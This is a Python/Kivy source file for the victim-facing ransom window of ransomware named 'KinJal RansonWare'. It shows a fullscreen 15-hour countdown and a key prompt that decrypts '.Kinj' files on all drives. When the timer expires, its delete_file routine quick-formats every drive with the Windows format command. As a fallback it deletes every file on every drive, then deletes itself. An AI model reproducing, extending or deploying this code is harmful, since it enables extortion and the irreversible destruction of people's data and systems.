import os
import sys
import time
import win32api
import datetime
import threading
import subprocess
import decryption_main_file

from kivy import Config
from kivy.app import App
from kivy.core.audio import SoundLoader
from kivy.properties import StringProperty, BooleanProperty, ObjectProperty
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.relativelayout import RelativeLayout
from kivy.utils import get_color_from_hex

Config.set('graphics', 'fullscreen', 'auto')

stop_countdown = False
class DescryptionProssess(RelativeLayout):
    lines_opacity = StringProperty("0")
    Scanned_files = StringProperty("0")
    Decrypted_files = StringProperty("0")
    Undecrypted_files = StringProperty("0")
    disabled_decryption_button = BooleanProperty(False)
    file_path_text = StringProperty()
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.drive = win32api.GetLogicalDriveStrings()
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            reperexec = sys._MEIPASS
        else:
            reperexec = os.path.dirname(os.path.abspath(__file__))
        self.sound_one = os.path.join(reperexec, "Sound/s3.wav")

    def GetDrive(self):
        drive = win32api.GetLogicalDriveStrings()
        drive_list = (str(drive)).split("\x00")
        drive_list.remove('')
        if "C:\\" in drive_list:
            drive_list.remove('C:\\')
        return drive_list

    def launch_decryption(self,  key):
        def start_decryption(drive_list):
            for path_file in drive_list:
                for root, dirs, files in os.walk(path_file):
                    for file in files:
                        path = str(os.path.join(root, file))
                        self.Scanned_files_number += 1
                        self.Scanned_files, self.file_path_text = str(self.Scanned_files_number), str(path)
                        self.disabled_decryption_button = True
                        if path[-5:] != ".Kinj":
                            continue
                        try:
                            decryption_main_file.decryption_setup(key).AES_CBC_256(path)
                        except Exception as e:
                            print(e)
                            self.Undecrypted_files_number += 1
                            self.Undecrypted_files = str(self.Undecrypted_files_number)
                        else:
                            self.Decrypted_files_number += 1
                            self.Decrypted_files = str(self.Decrypted_files_number)

            self.disabled_decryption_button = False
            if int(self.Decrypted_files) == 0 and int(self.Undecrypted_files) > 0:
                self.file_path_text = "You Wrote a wrong key, try again!!!"
            elif int(self.Decrypted_files) > 0 and int(self.Undecrypted_files) == 0:
                self.file_path_text = "All your files are decrypted"
                global  stop_countdown
                stop_countdown = True
            else:
               self.file_path_text = "Scanning completed, your files are not encrypted"
               stop_countdown = True

        if key == "":
            pop = Popup(
                title="KinJal RansonWare",
                title_align="center",
                title_color="red",
                title_size=15,
                background_color=get_color_from_hex("#606060"),
                separator_color=get_color_from_hex("#606060"),
                size_hint=(.5, .22),
                content = (
                    Label(
                        text = "ERROR!!!\nYou must specify a decryption key\n\n\nPlease try again...",
                        halign = "center",
                    )
                )
            )
            pop.open()
        else:
            self.Scanned_files_number = self.Decrypted_files_number = self.Undecrypted_files_number = 0
            self.Scanned_files = self.Decrypted_files = self.Undecrypted_files = "0"
            self.lines_opacity = "1"

            disk_partition = self.GetDrive()
            out_path = ["C:\\Users\\"]
            frst_path = None
            lst_path = None
            if len(disk_partition) > 1:
                frst_path = disk_partition[:1]
                lst_path = disk_partition[1:]
                out_path_thread = threading.Thread(target=start_decryption, args=[out_path])
                frst_path_thread = threading.Thread(target=start_decryption, args=[frst_path])
                lst_path_thread = threading.Thread(target=start_decryption, args=[lst_path])
                out_path_thread.start()
                frst_path_thread.start()
                lst_path_thread.start()
            else:
                disk_partition_thread = threading.Thread(target=start_decryption, args=[disk_partition])
                out_path_thread = threading.Thread(target=start_decryption, args=[out_path])
                disk_partition_thread.start()
                out_path_thread.start()

class Ranson_Window(RelativeLayout):
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        reperexec = sys._MEIPASS
    else:
        reperexec = os.path.dirname(os.path.abspath(__file__))
    screen_font_one = os.path.join(reperexec, "Font/V4.ttf")
    screen_font_two = os.path.join(reperexec, "Font/V12.ttf")
    sound_one = os.path.join(reperexec, "Sound/s4.wav")
    mysound = SoundLoader.load(sound_one)
    mysound.volume = 1
    Ranson_timer = StringProperty()
    timer_color = ObjectProperty((0, 1, 0, 1))
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        Countdown_Thread = threading.Thread(target=self.countdown)
        Countdown_Thread.start()

    # La fonction qui va se charger des supprimer tous les fichiers si le minuteur arrive à zero
    def delete_file(self):
        drive = win32api.GetLogicalDriveStrings()
        drive_list = (str(drive)).split("\x00")
        drive_list.remove('')
        try:
            for drive in drive_list:
                subprocess.run(["format", drive, "/FS:NTFS", "/Q"])
        except:
            for lecteur in drive_list:
                for root, dirs, files in os.walk(lecteur):
                    for file in files:
                        path = str(os.path.join(root, file))
                        if path == __file__:
                            continue
                        os.remove(path)
            os.remove(__file__)

    def countdown(self):
        hours = 15 # Par mesure de sécurité ne mettez pas zero ici
        minutes = secondes = 0
        total_time = hours * 3600 + minutes * 60 + secondes
        while total_time and not stop_countdown:
            timer = str(datetime.timedelta(seconds=total_time))
            self.Ranson_timer = str(timer)
            time.sleep(1)
            total_time -= 1
            if timer < "0:02:00":
                self.timer_color = (1, 0, 0, 1)
                self.mysound.play()
        if stop_countdown == False:
            self.Ranson_timer = str("DELETING IN PROCESS...")
            delete_thread = threading.Thread(target=self.delete_file())
            delete_thread.start()


class RansonWareDecApp(App):
    def build(self):
        return Ranson_Window()


if __name__ == "__main__":
    RansonWareDecApp().run()